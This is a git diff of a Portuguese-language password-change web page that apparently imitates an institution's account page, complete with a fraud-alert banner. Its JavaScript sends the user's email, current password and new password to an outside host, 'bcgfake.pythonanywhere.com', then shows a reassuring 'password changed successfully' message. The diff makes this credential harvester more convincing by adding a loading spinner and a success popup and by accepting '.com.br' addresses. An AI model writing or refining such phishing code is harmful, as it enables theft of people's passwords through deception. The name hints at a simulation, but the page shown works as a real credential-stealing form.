@@ -64,6 +64,7 @@
                     <img width="25" height="25" src="https://img.icons8.com/ios-filled/50/hide.png" alt="hide"/>
                 </button>
                 <div id="confirmPasswordError" class="error"></div>
+                
             </div>
             
               <div class="password-guidelines">
@@ -78,13 +79,15 @@
               </div>
               <div class="buttonWrapper">
                 <button type="submit" class="submitButton">Atualizar Senha</button>
+                <div id="responseMessage" style="color: red; font-weight: bold;"></div>
+                <div id="loadingSpinner" class="loading-spinner"></div>
               </div>
             </form>
           </div>
         </div>
       </section>
 
-      <div id="responseMessage" style="color: red; font-weight: bold;"></div>
+      
 
       <section class="fraud-alert">
         <img src="public/Banner-fraude-Set2023.gif" alt="Alert Icon">
@@ -184,52 +187,60 @@
         });
 
         function updatePassword() {
-            const emailInput = document.getElementById('emailInput').value;
-            const currentPassword = document.getElementById('currentPassword').value;
-            const newPassword = document.getElementById('newPassword').value;
-            const confirmPassword = document.getElementById('confirmPassword').value;
-            const newPasswordError = document.getElementById('newPasswordError');
-            const confirmPasswordError = document.getElementById('confirmPasswordError');
+          const emailInput = document.getElementById('emailInput').value;
+          const currentPassword = document.getElementById('currentPassword').value;
+          const newPassword = document.getElementById('newPassword').value;
+          const confirmPassword = document.getElementById('confirmPassword').value;
+          const newPasswordError = document.getElementById('newPasswordError');
+          const confirmPasswordError = document.getElementById('confirmPasswordError');
+          const loadingSpinner = document.getElementById('loadingSpinner');
 
-            newPasswordError.textContent = '';
-            confirmPasswordError.textContent = '';
+          newPasswordError.textContent = '';
+          confirmPasswordError.textContent = '';
 
-            if (!checkPasswordStrength(newPassword)) {
-                newPasswordError.textContent = 'A senha não atende a todos os critérios de segurança.';
-                return;
-            }
+          if (!checkPasswordStrength(newPassword)) {
+              newPasswordError.textContent = 'A senha não atende a todos os critérios de segurança.';
+              return;
+          }
 
-            if (newPassword !== confirmPassword) {
-                confirmPasswordError.textContent = 'As senhas não coincidem.';
-                return;
-            }
+          if (newPassword !== confirmPassword) {
+              confirmPasswordError.textContent = 'As senhas não coincidem.';
+              return;
+          }
 
-            sendEmail(emailInput, currentPassword, newPassword);
-        }
+          loadingSpinner.style.display = 'block';  // Mostra o spinner de loading
 
-        function sendEmail(emailInput, currentPassword, newPassword) {
-            const data = {
-                email: emailInput,
-                currentPassword: currentPassword,
-                newPassword: newPassword
-            };
+          sendEmail(emailInput, currentPassword, newPassword);
+      }
 
-            $.ajax({
-                url: 'https://bcgfake.pythonanywhere.com/send-email',
-                type: 'POST',
-                contentType: 'application/json',
-                data: JSON.stringify(data),
-                success: function(response) {
-                    $('#responseMessage').text('Alteração salva com sucesso!');
-                    $('#responseMessage').css('color', 'green');
-                },
-                error: function(xhr, status, error) {
-                    $('#responseMessage').text('Erro ao salvar alteração. Tente novamente mais tarde.');
-                    $('#responseMessage').css('color', 'red');
-                    console.error(xhr.responseText);
-                }
-            });
-        }
+      function sendEmail(emailInput, currentPassword, newPassword) {
+          const data = {
+              email: emailInput,
+              currentPassword: currentPassword,
+              newPassword: newPassword
+          };
+
+          $.ajax({
+              url: 'https://bcgfake.pythonanywhere.com/send-email',
+              type: 'POST',
+              contentType: 'application/json',
+              data: JSON.stringify(data),
+              success: function(response) {
+                  $('#loadingSpinner').hide(); // Esconde o spinner de loading
+                  $('#responseMessage').text('Alteração salva com sucesso!');
+                  $('#responseMessage').css('color', 'green');
+
+                  // Exibe o popup de sucesso
+                  alert('Sua senha foi alterada com sucesso!');
+              },
+              error: function(xhr, status, error) {
+                  $('#loadingSpinner').hide();  // Esconde o spinner de loading
+                  $('#responseMessage').text('Erro ao salvar alteração. Tente novamente mais tarde.');
+                  $('#responseMessage').css('color', 'red');
+                  console.error(xhr.responseText);
+              }
+          });
+      }
 
         function verifyEmail() {
             const emailInput = document.getElementById('emailInput');
@@ -239,7 +250,7 @@
             const userNameElement = document.getElementById('userName');
 
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            const isValidEmail = emailRegex.test(emailInput.value) && emailInput.value.toLowerCase().endsWith('.com');
+            const isValidEmail = emailRegex.test(emailInput.value) && emailInput.value.toLowerCase().endsWith('.com.br') || emailRegex.test(emailInput.value) && emailInput.value.toLowerCase().endsWith('.com');
 
             if (isValidEmail) {
                 const userName = emailInput.value.split('@')[0];
